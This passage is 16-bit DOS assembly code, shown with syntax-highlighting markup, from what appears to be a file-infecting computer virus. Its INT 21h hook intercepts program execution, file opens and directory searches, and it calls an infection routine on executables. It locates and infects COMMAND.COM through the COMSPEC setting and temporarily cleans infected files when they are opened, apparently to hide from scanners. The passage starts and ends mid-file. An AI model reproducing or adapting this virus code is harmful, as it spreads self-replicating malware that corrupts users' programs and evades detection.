</span><span class="sc5">pass2f</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
         </span><span class="sc5">TRAPPED_2F</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">HOOK_21</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">command_flag</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Check_int</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@COMM_COM</span><span class="sc0">

</span><span class="sc5">Check_int</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">sleep</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">org_21</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_w</span><span class="sc4">]</span><span class="sc0">                                   </span><span class="sc1">;4b00h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@EXEC00</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_w</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">;4b01h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@LD</span><span class="sc4">&amp;</span><span class="sc5">EX</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_b</span><span class="sc4">]</span><span class="sc0">                                   </span><span class="sc1">;1ah</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@SAVEDTA</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_b</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">;4eh</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@FINDFIRST</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_b</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">;4fh</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@FINDNEXT</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_b</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">;3dh</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@OPEN</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_b</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">;3eh</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@CLOSE</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_w</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">;6c00h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@EXTOPEN</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_b</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">;11h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@FCB_FIND</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">intr_sub_b</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">;12h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@FCB_FIND</span><span class="sc0">


</span><span class="sc5">org_21</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
         </span><span class="sc5">TRAPPED_21</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">@COMM_COM</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">COMseg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">

</span><span class="sc5">@pre_loop</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'SMOC'</span><span class="sc0">
</span><span class="sc5">@loop_a</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">scasd</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@nxt_ck</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@loop_a</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@fail</span><span class="sc0">

</span><span class="sc5">@nxt_ck</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'=CEP'</span><span class="sc0">
         </span><span class="sc6">scasd</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@it_is</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@pre_loop</span><span class="sc0">

</span><span class="sc5">@it_is</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Data_Buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">

</span><span class="sc5">@loop_b</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@copy_end</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@loop_b</span><span class="sc0">
</span><span class="sc5">@copy_end</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Data_Buffer</span><span class="sc0">               </span><span class="sc1">; DS:DX command.com path</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFattrib</span><span class="sc0">                          </span><span class="sc1">; CX attributo</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@fail</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">openfile</span><span class="sc0">                            </span><span class="sc1">; BX handle</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileInfect</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closefile</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFattrib</span><span class="sc0">

</span><span class="sc5">@fail</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">command_flag</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@EXEC00</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckIfExe</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">org_21</span><span class="sc0">

         </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                 </span><span class="sc1">; DS:DX ASCIZ filename</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vir_handler</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getFattrib</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@no_inf</span><span class="sc0">                           </span><span class="sc1">; CX attributo</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">openfile</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileInfect</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closefile</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFattrib</span><span class="sc0">

</span><span class="sc5">@no_inf</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_handler</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Intret</span><span class="sc0">


</span><span class="sc5">@LD</span><span class="sc4">&amp;</span><span class="sc5">EX</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vir_handler</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFattrib</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">ex_ld</span><span class="sc0">                          </span><span class="sc1">; CX attributo</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ex_ld</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileClean</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closefile</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFattrib</span><span class="sc0">

</span><span class="sc5">ex_ld</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_handler</span><span class="sc0">

         </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vir_handler</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFattrib</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">not_ld</span><span class="sc0">                             </span><span class="sc1">; CX attrib</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileInfect</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closefile</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFattrib</span><span class="sc0">

</span><span class="sc5">not_ld</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_handler</span><span class="sc0">

         </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Intret</span><span class="sc0">


</span><span class="sc5">@OPEN</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckIfExe</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">org_21</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vir_handler</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFattrib</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">Skip_file</span><span class="sc0">                           </span><span class="sc1">; CX attrib</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileClean</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFattrib</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_handler</span><span class="sc0">

         </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@no_open</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PushHandle</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Intret</span><span class="sc0">

</span><span class="sc5">@no_open</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushf</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@no_mat</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vir_handler</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFattrib</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@a</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileInfect</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFattrib</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_handler</span><span class="sc0">

</span><span class="sc5">@a</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">@no_mat</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popf</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Intret</span><span class="sc0">

</span><span class="sc5">Skip_file</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_handler</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">org_21</span><span class="sc0">

</span><span class="sc5">@EXTOPEN</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckIfExe</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">org_21</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vir_handler</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFattrib</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@aa</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileClean</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closefile</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFattrib</span><span class="sc0">

</span><span class="sc5">@aa</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_handler</span><span class="sc0">

         </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@no_open</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PushHandle</span><span class="sc0">                                    </span><span class="sc1">; save handle</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Intret</span><span class="sc0">


</span><span class="sc1">; // SFT and JFT didn't work in Msdos Prompt :(( //</span><span class="sc0">

</span><span class="sc5">@CLOSE</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Pophandle</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">org_21</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vir_handler</span><span class="sc0">

         </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">                                </span><span class="sc1">; BX handle</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int2fh</span><span class="sc0">                                 </span><span class="sc1">; ES:DI JFT</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">                                </span><span class="sc1">; bx entry number for</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int2fh</span><span class="sc0">                                 </span><span class="sc1">; ES:DI SFT</span><span class="sc0">

